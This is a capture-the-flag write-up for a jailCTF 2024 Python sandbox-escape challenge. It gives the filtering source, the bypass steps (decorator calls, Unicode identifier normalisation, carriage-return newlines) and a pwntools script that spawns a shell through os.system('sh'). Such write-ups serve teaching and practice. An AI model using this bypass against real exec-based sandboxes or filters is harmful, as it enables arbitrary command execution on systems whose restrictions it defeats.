# jailCTF 2024 no-nonsense

```python
#!/usr/local/bin/python3
from ast import parse, NodeVisitor

inp = input('> ')
if any(c in inp for c in '([=])'):
    print('no.')
    exit()

class NoNonsenseVisitor(NodeVisitor):
    def visit_Name(self, n):
        if n.id in inp:  # surely impossible to get around this since all utf8 chars will be the same between ast.parse and inp, right?
            print('no ' + n.id)
            exit()


NoNonsenseVisitor().visit(parse(inp))

exec(inp)  # management told me they need to use exec and not eval. idk why but they said something about multiline statements? idk
```

Requirements:

1. No `([=])`: call functions using decorators, `@exec\n@input\nclass a: pass`
2. AST name does not appear in input: use unicode bypass
3. No newlines: use `\r` instead of `\n` for multiline code

Inspired by <https://shirajuki.js.org/blog/pyjail-cheatsheet/#decorators>.

Attack script:

```python
from pwn import *

context(log_level="debug")

p = process(["python3", "no-nonsense.py"])


def bypass(text):
    # unicode bypass
    encoded = ""
    for ch in text:
        if ch.isalpha():
            encoded += chr(ord(ch) + 0x1D41A - ord("a"))
        else:
            encoded += ch
    return encoded


text = f"""
@{bypass("exec")}
@{bypass("input")}
class a: pass
""".replace(
    "\n", "\r"
)

print(text)
p.sendline(text.encode())
# get shell
p.sendline(b"import os;os.system('sh')")
p.interactive()
```

Official writeup: <https://github.com/jailctf/challenges-2024/blob/master/no-nonsense/solve/payload.txt>.
